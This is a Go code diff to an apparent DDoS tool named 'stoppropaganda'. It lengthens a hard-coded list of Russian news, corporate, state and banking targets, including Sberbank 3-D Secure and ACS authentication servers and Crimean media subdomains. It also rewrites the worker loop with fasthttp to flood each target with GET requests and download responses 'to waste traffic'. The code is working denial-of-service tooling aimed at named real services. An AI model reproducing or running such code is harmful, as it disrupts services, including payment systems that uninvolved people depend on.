@@ -2,12 +2,12 @@ package stoppropaganda
 
 import (
 	"io"
-	"io/ioutil"
-	"net/http"
 	"net/url"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/valyala/fasthttp"
 )
 
 // Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233
@@ -32,47 +32,59 @@ var targetWebsites = map[string]struct{}{
 	/* Russia */
 
 	// Propaganda
-	"https://lenta.ru":           {},
-	"https://ria.ru":             {},
-	"https://ria.ru/lenta":       {},
-	"https://www.rbc.ru":         {},
-	"https://www.rt.com":         {},
-	"https://api.rt.com":         {},
-	"https://smotrim.ru":         {},
-	"https://api.smotrim.ru":     {},
-	"https://tass.ru":            {},
-	"https://api.tass.ru":        {},
-	"https://tvzvezda.ru":        {},
-	"https://vsoloviev.ru":       {},
-	"https://www.1tv.ru":         {},
-	"https://api.1tv.ru":         {},
-	"https://www.vesti.ru":       {},
-	"https://zakupki.gov.ru":     {},
-	"https://er.ru":              {},
-	"https://www.rzd.ru":         {},
-	"https://rzdlog.ru":          {},
-	"https://vgtrk.ru":           {},
-	"https://www.interfax.ru":    {},
-	"https://ugmk.ua":            {},
-	"https://iz.ru":              {},
-	"https://vz.ru":              {},
-	"https://sputniknews.ru":     {},
-	"https://www.gazeta.ru":      {},
-	"https://www.kp.ru":          {},
-	"https://riafan.ru":          {},
-	"https://api.riafan.ru":      {},
-	"https://pikabu.ru":          {},
-	"https://api.pikabu.ru":      {},
-	"https://www.kommersant.ru":  {},
-	"https://omk.ru":             {},
-	"https://www.yaplakal.com":   {},
-	"https://bezformata.com":     {},
-	"https://api.bezformata.com": {},
-	"https://regnum.ru":          {},
-	"https://eadaily.com":        {},
-	"https://www.rubaltic.ru":    {},
-  "https://www.rambler.ru":    {},
-	"https://mail.ru":           {},
+	"https://lenta.ru":                       {},
+	"https://ria.ru":                         {},
+	"https://ria.ru/lenta":                   {},
+	"https://www.rbc.ru":                     {},
+	"https://www.rt.com":                     {},
+	"https://api.rt.com":                     {},
+	"https://smotrim.ru":                     {},
+	"https://api.smotrim.ru":                 {},
+	"https://tass.ru":                        {},
+	"https://api.tass.ru":                    {},
+	"https://tvzvezda.ru":                    {},
+	"https://vsoloviev.ru":                   {},
+	"https://www.1tv.ru":                     {},
+	"https://api.1tv.ru":                     {},
+	"https://www.vesti.ru":                   {},
+	"https://zakupki.gov.ru":                 {},
+	"https://er.ru":                          {},
+	"https://www.rzd.ru":                     {},
+	"https://rzdlog.ru":                      {},
+	"https://vgtrk.ru":                       {},
+	"https://www.interfax.ru":                {},
+	"https://ugmk.ua":                        {},
+	"https://iz.ru":                          {},
+	"https://vz.ru":                          {},
+	"https://sputniknews.ru":                 {},
+	"https://www.gazeta.ru":                  {},
+	"https://www.kp.ru":                      {},
+	"https://riafan.ru":                      {},
+	"https://api.riafan.ru":                  {},
+	"https://pikabu.ru":                      {},
+	"https://api.pikabu.ru":                  {},
+	"https://www.kommersant.ru":              {},
+	"https://omk.ru":                         {},
+	"https://www.yaplakal.com":               {},
+	"https://bezformata.com":                 {},
+	"https://api.bezformata.com":             {},
+	"https://regnum.ru":                      {},
+	"https://eadaily.com":                    {},
+	"https://www.rubaltic.ru":                {},
+  "https://www.rambler.ru":                 {},
+	"https://mail.ru":                        {},
+  "https://simferopol.miranda-media.ru":    {},
+	"https://sevastopol.miranda-media.ru":    {},
+	"https://novoozernoye.miranda-media.ru":  {},
+	"https://feodosia.miranda-media.ru":      {},
+	"https://yalta.miranda-media.ru":         {},
+	"https://alupka.miranda-media.ru":        {},
+	"https://inkerman.miranda-media.ru":      {},
+	"https://primorskij.miranda-media.ru":    {},
+	"https://oliva.miranda-media.ru":         {},
+	"https://foros.miranda-media.ru":         {},
+	"https://chernomorskoe.miranda-media.ru": {},
+	"https://kirovskoe.miranda-media.ru":     {},
 
 	// Business corporations
 	"https://www.gazprom.ru":                    {},
@@ -112,19 +124,29 @@ var targetWebsites = map[string]struct{}{
 	"https://aliexpress.ru":                     {},
 
 	// Banks
-	"https://www.sberbank.ru":                          {},
-	"https://online.sberbank.ru":                       {},
-	"https://api.developer.sber.ru/product/SberbankID": {},
-	"https://api.sberbank.ru/prod/tokens/v2":           {},
-	"https://api.sberbank.ru/prod/tokens/v2/oauth":     {},
-	"https://api.sberbank.ru/prod/tokens/v2/oidc":      {},
-	"https://www.vtb.ru":                               {},
-	"https://api.vtb.ru":                               {},
-	"https://www.gazprombank.ru":                       {},
-	"https://api.gazprombank.ru":                       {},
-	"https://www.moex.com":                             {},
-	"https://api.moex.com":                             {},
-	"http://www.fsb.ru":                                {},
+	"https://www.sberbank.ru":                           {},
+	"https://online.sberbank.ru":                        {},
+	"https://api.developer.sber.ru/product/SberbankID":  {},
+	"https://api.sberbank.ru/prod/tokens/v2":            {},
+	"https://api.sberbank.ru/prod/tokens/v2/oauth":      {},
+	"https://api.sberbank.ru/prod/tokens/v2/oidc":       {},
+	"https://www.vtb.ru":                                {},
+	"https://api.vtb.ru":                                {},
+	"https://www.gazprombank.ru":                        {},
+	"https://api.gazprombank.ru":                        {},
+	"https://www.moex.com":                              {},
+	"https://api.moex.com":                              {},
+	"http://www.fsb.ru":                                 {},
+  "https://scr.online.sberbank.ru/api/fl/idgib-w-3ds": {},
+	"https://3dsec.sberbank.ru/mportal3/auth/login":     {},
+	"https://acs1.sbrf.ru":                              {},
+	"https://acs2.sbrf.ru":                              {},
+	"https://acs3.sbrf.ru":                              {},
+	"https://acs4.sbrf.ru":                              {},
+	"https://acs5.sbrf.ru":                              {},
+	"https://acs6.sbrf.ru":                              {},
+	"https://acs7.sbrf.ru":                              {},
+	"https://acs8.sbrf.ru":                              {},
 
 	//The state
 	"https://gosuslugi.ru":         {},
@@ -146,8 +168,8 @@ var targetWebsites = map[string]struct{}{
 	"http://pochta.ru":             {},
 	"http://crimea-post.ru":        {},
 
-        // Embassy
-	"https://montreal.mid.ru":      {},
+	// Embassy
+	"https://montreal.mid.ru": {},
 
 	// Others
 	"https://109.207.1.118":          {},
@@ -329,28 +351,29 @@ type Website struct {
 }
 
 func (ws *Website) Start(endpoint string) {
+	// Extract domain out of address
 	websiteURL, err := url.Parse(endpoint)
 	if err != nil {
 		panic(err)
 	}
-
-	// Create request
-	req, err := http.NewRequest("GET", endpoint, nil)
-	if err != nil {
-		panic(err)
-	}
-
-	// Set headers
-	req.Header.Set("Host", websiteURL.Host)
-	req.Header.Set("User-Agent", *flagUserAgent)
-	req.Header.Set("Accept", "*/*")
 
 	ws.WorkersStatus = "Initializing"
 	ws.pauseMux = &sync.Mutex{}
 	ws.paused = false
 	ws.dnsLastChecked = time.Now().Add(-1 * VALIDATE_DNS_EVERY) // this forces to validate on first run
 
+	// Create request
+	req := fasthttp.AcquireRequest()
+	req.SetRequestURI(endpoint)
+	req.Header.SetMethod(fasthttp.MethodGet)
+	req.Header.Set("Host", websiteURL.Host)
+	req.Header.Set("User-Agent", *flagUserAgent)
+	req.Header.Set("Accept", "*/*")
+
 	f := func() {
+		// Create response
+		resp := fasthttp.AcquireResponse()
+
 		for {
 			ws.pauseMux.Lock()
 			if time.Since(ws.dnsLastChecked) >= VALIDATE_DNS_EVERY {
@@ -377,17 +400,15 @@ func (ws *Website) Start(endpoint string) {
 					continue
 				}
 
-				for _, ip := range ipAddresses {
-					if ip.IsPrivate() || ip.IsLoopback() {
-						ws.mux.Lock()
-						ws.WorkersStatus = "Private IP detected"
-						ws.paused = true
-						ws.mux.Unlock()
+				if containsPrivateIP(ipAddresses) {
+					ws.mux.Lock()
+					ws.WorkersStatus = "Private IP detected"
+					ws.paused = true
+					ws.mux.Unlock()
 
-						time.Sleep(5 * time.Minute)
-						ws.pauseMux.Unlock()
-						break
-					}
+					time.Sleep(5 * time.Minute)
+					ws.pauseMux.Unlock()
+					continue
 				}
 
 				ws.mux.Lock()
@@ -398,57 +419,41 @@ func (ws *Website) Start(endpoint string) {
 			ws.pauseMux.Unlock()
 
 			// Perform request
-			resp, err := httpClient.Do(req)
+			err := httpClient.DoTimeout(req, resp, *flagTimeout)
 			if err != nil {
 				ws.mux.Lock()
 				ws.Requests++
 				ws.Errors++
-				switch {
-				case strings.HasSuffix(err.Error(), "(Client.Timeout exceeded while awaiting headers)"):
-					ws.LastErrorMsg = "Request timed out"
-				case strings.HasSuffix(err.Error(), "connection refused"):
-					ws.LastErrorMsg = "Connection refused"
-				case strings.HasSuffix(err.Error(), "EOF"):
-					ws.LastErrorMsg = "Lost connection (EOF)"
-				default:
-					ws.LastErrorMsg = err.Error()
-				}
+				ws.LastErrorMsg = err.Error()
 				ws.mux.Unlock()
 				continue
 			}
+			responseCode := resp.StatusCode()
 
 			// Increase counters
 			ws.mux.Lock()
 			ws.Requests++
-			if resp.StatusCode < 200 {
+			switch {
+			case responseCode < 200:
 				ws.Counter_code100++
-			} else if resp.StatusCode < 300 {
+			case responseCode < 300:
 				ws.Counter_code200++
-			} else if resp.StatusCode < 400 {
+			case responseCode < 400:
 				ws.Counter_code300++
-			} else if resp.StatusCode < 500 {
+			case responseCode < 500:
 				ws.Counter_code400++
-			} else {
+			default:
 				ws.Counter_code500++
 			}
 			ws.mux.Unlock()
 
-			// Download (and discard) response body to waste traffic
-			_, err = io.Copy(ioutil.Discard, resp.Body)
-			if err != nil {
+			// Download content, to waste traffic
+			if err = resp.BodyWriteTo(io.Discard); err != nil {
 				ws.mux.Lock()
 				ws.Errors++
-				switch {
-				case strings.HasSuffix(err.Error(), "(Client.Timeout exceeded while awaiting headers)"):
-					ws.LastErrorMsg = "Response body timed out"
-				case strings.HasSuffix(err.Error(), "EOF"):
-					ws.LastErrorMsg = "Lost connection (EOF)"
-				default:
-					ws.LastErrorMsg = err.Error()
-				}
+				ws.LastErrorMsg = err.Error()
 				ws.mux.Unlock()
 			}
-			resp.Body.Close()
 		}
 	}
 
